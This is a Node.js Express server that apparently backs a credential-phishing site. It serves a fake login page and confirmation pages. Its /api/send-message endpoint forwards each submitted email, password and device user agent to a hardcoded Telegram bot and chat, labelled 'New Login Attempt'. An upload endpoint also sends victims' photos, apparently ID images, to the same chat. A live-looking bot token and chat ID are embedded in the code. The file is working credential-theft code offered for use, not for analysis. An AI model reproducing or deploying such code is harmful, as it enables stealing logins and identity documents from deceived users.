const express = require('express');
const path = require('path');
const fs = require('fs');

const multer = require('multer');
const upload = multer({ storage: multer.memoryStorage() });

const app = express();
const PORT = process.env.PORT || 5000;

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8753866555:AAGzlmQVG2j8u6WZ8AFXpsohvX5d1QyHH_4";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "1103460858";

console.log('Starting simple server...');
console.log('Current directory:', __dirname);
console.log('Environment:', process.env.NODE_ENV || 'development');

// Check if the index.html file exists
const indexPath = path.join(__dirname, 'index.html');
if (fs.existsSync(indexPath)) {
  console.log(`Index file exists at: ${indexPath}`);
} else {
  console.error(`ERROR: Index file NOT found at: ${indexPath}`);
}

// Set headers to allow cross-origin requests
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// Parse JSON request bodies
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// Log all requests
app.use((req, res, next) => {
  console.log(`Request: ${req.method} ${req.url}`);
  next();
});

// Serve static files from the root directory
app.use(express.static(__dirname));

// Health check endpoint for deployment platforms
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Root route - serve the login page
app.get('/', (req, res) => {
  console.log('Serving index.html');
  res.sendFile(indexPath);
});

// Serve the sent page
app.get('/sent', (req, res) => {
  res.sendFile(path.join(__dirname, 'sent.html'));
});

// Serve the final confirmation page
app.get('/final-confirmation', (req, res) => {
  res.sendFile(path.join(__dirname, 'final_confirmation.html'));
});

// API endpoint to notify telegram that user is waiting
app.post('/api/notify-waiting', async (req, res) => {
  try {
    const { message, timestamp } = req.body;
    console.log(`[${timestamp}] Telegram Alert: ${message}`);
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const text = (message.includes('🎯') || message.includes('🔐') || message.includes('📄')) 
      ? `${message}\n\n<b>Time:</b> ${timestamp}`
      : `⏳ <b>Action Notification</b>\n\n${message}\n\n<b>Time:</b> ${timestamp}`;
    
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text,
          parse_mode: 'HTML'
        })
      });
      const data = await response.json();
      console.log('Telegram notification sent:', data.ok);
    } catch (tgError) {
      console.error('Failed to send waiting notification to Telegram:', tgError);
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error in notify-waiting endpoint:', error);
    res.status(500).json({ success: false });
  }
});

// API endpoint to receive form data
app.post('/api/send-message', async (req, res) => {
  try {
    const { email, password, deviceInfo } = req.body;
    const timestamp = new Date().toLocaleString();
    console.log('Login attempt received:');
    console.log('- Email/Username:', email);
    console.log('- Password:', password);
    if (deviceInfo) {
      console.log('- Device Info:', JSON.stringify(deviceInfo));
    }
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const text = `🎯 <b>New Login Attempt</b>\n\n<b>Email/User:</b> <code>${email}</code> \n<b>Password:</b> <code>${password}</code> \n<b>Time:</b> ${timestamp}\n\n<b>Device:</b> ${deviceInfo ? deviceInfo.userAgent : 'Unknown'}`;
    
    try {
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text,
          parse_mode: 'HTML'
        })
      });
    } catch (tgError) {
      console.error('Failed to send login notification to Telegram:', tgError);
    }
    
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error in send-message endpoint:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// API endpoint to upload photo to telegram
app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
  try {
    const { caption } = req.body;
    const photo = req.file;

    if (!photo) {
      return res.status(400).json({ success: false, error: 'No photo provided' });
    }

    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('caption', caption);
    const blob = new Blob([photo.buffer], { type: photo.mimetype });
    formData.append('photo', blob, photo.originalname);

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });

    const data = await response.json();
    console.log('Telegram photo sent:', data.ok);
    res.status(200).json({ success: data.ok });
  } catch (error) {
    console.error('Error in upload-photo endpoint:', error);
    res.status(500).json({ success: false });
  }
});

// Start the server
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`Simple server running on http://0.0.0.0:${PORT}`);
  console.log(`Serving index.html directly from root directory`);
});

// Keep the server running and add some heartbeat logging
setInterval(() => {
  console.log("Server heartbeat - still running");
}, 30000);

// Handle graceful shutdown for container environments
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});

// Prevent the script from exiting due to errors
process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err);
});
